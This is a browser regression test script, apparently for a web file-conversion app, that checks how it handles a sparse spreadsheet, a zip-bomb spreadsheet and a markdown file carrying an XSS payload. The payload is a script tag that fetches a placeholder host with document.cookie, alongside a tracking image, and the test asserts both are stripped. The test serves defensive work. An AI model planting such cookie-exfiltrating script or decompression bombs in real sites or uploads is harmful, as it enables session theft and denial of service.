// Real-browser resource exhaustion and HTML exfiltration regression tests.
// Synthetic inputs are generated locally, not uploaded to a service.
import { chromium, firefox, webkit } from 'playwright';
import JSZip from 'jszip';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';

const app = process.env.SMOKE_URL ?? 'https://convert-it-8wh.pages.dev';
const engine = process.argv[2] ?? 'chromium';
const browserEngine = { chromium, firefox, webkit }[engine];
if (!browserEngine) throw new Error('Expected chromium, firefox or webkit');
const browser = await browserEngine.launch(engine === 'chromium' ? { channel: 'chrome' } : {});
const origin = new URL(app).origin;
const results = [];

async function workbook(rows) {
  const zip = new JSZip();
  zip.file(
    'xl/workbook.xml',
    '<workbook xmlns:r="r"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>',
  );
  zip.file(
    'xl/_rels/workbook.xml.rels',
    '<Relationships><Relationship Id="rId1" Type="x/worksheet" Target="worksheets/sheet1.xml"/></Relationships>',
  );
  zip.file(
    'xl/worksheets/sheet1.xml',
    '<worksheet><sheetData>' + rows + '</sheetData></worksheet>',
  );
  return zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
}

async function newPage() {
  const page = await browser.newPage({ locale: 'en-US', acceptDownloads: true });
  const unexpected = [];
  page.on('request', (request) => {
    const url = new URL(request.url());
    if (url.origin !== origin) unexpected.push(url.origin);
    if (request.method() !== 'GET' && request.method() !== 'HEAD')
      unexpected.push(request.method() + ' ' + url.pathname);
  });
  await page.goto(app, { waitUntil: 'networkidle' });
  return { page, unexpected };
}

try {
  const cases = [
    [
      'sparse-xlsx',
      await workbook(
        '<row r="1"><c r="A1"><v>1</v></c></row><row r="1048576"><c r="XFD1048576"><v>2</v></c></row>',
      ),
    ],
    ['zip-bomb-xlsx', await workbook('<!--' + 'A'.repeat(9 * 1024 * 1024) + '-->')],
  ];
  for (const [name, data] of cases) {
    const { page, unexpected } = await newPage();
    try {
      if (data.byteLength > 40000) throw new Error('Fixture not compressed enough');
      await page.setInputFiles('input[type="file"]:not([webkitdirectory])', {
        name: name + '.xlsx',
        mimeType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        buffer: data,
      });
      await page.locator('[role="listitem"]').first().waitFor({ timeout: 15000 });
      await page.locator('select[aria-label="Target format"]').first().selectOption('csv');
      await page.locator('button[aria-label^="CONVERT →"]').first().click();
      await page.locator('button[aria-label="RETRY"]').first().waitFor({ timeout: 30000 });
      if (unexpected.length) throw new Error('Unexpected network request: ' + unexpected.join(','));
      if (page.isClosed()) throw new Error('Tab crashed');
      results.push({ name, ok: true, note: 'rejected safely; compressed=' + data.length + 'B' });
    } catch (err) {
      results.push({ name, ok: false, note: err.message.split('\n')[0] });
    } finally {
      await page.close();
    }
  }
  const { page, unexpected } = await newPage();
  try {
    const canary = 'SENSITIVE_DOC_CANARY_20261013_E8A';
    await page.setInputFiles('input[type="file"]:not([webkitdirectory])', {
      name: 'injection.md',
      mimeType: 'text/markdown',
      buffer: Buffer.from(
        '# Safe\n\n' +
          canary +
          '\n\n<script>fetch("https://bad.invalid/" + document.cookie)</script>\n\n<img src="https://bad.invalid/tracker">',
      ),
    });
    await page.locator('[role="listitem"]').first().waitFor();
    await page.locator('select[aria-label="Target format"]').first().selectOption('html');
    await page.locator('button[aria-label^="CONVERT →"]').first().click();
    const done = page.locator('button[aria-label="DOWNLOAD"]').first();
    await done.waitFor({ timeout: 20000 });
    const [download] = await Promise.all([page.waitForEvent('download'), done.click()]);
    const html = readFileSync(await download.path(), 'utf8');
    if (!html.includes(canary) || /<script|bad\.invalid|<img/i.test(html))
      throw new Error('Artifact sanitization failed');
    if (unexpected.length) throw new Error('Unexpected network request: ' + unexpected.join(','));
    results.push({
      name: 'html-xss-egress',
      ok: true,
      note: 'sanitized; no observed external request',
    });
  } catch (err) {
    results.push({ name: 'html-xss-egress', ok: false, note: err.message.split('\n')[0] });
  } finally {
    await page.close();
  }
} finally {
  await browser.close();
}
for (const r of results)
  console.log((r.ok ? 'PASS' : 'FAIL') + ' ' + engine + ' ' + r.name + ': ' + r.note);
console.log(results.filter((r) => r.ok).length + '/' + results.length + ' passed');
if (results.some((r) => !r.ok)) process.exitCode = 1;
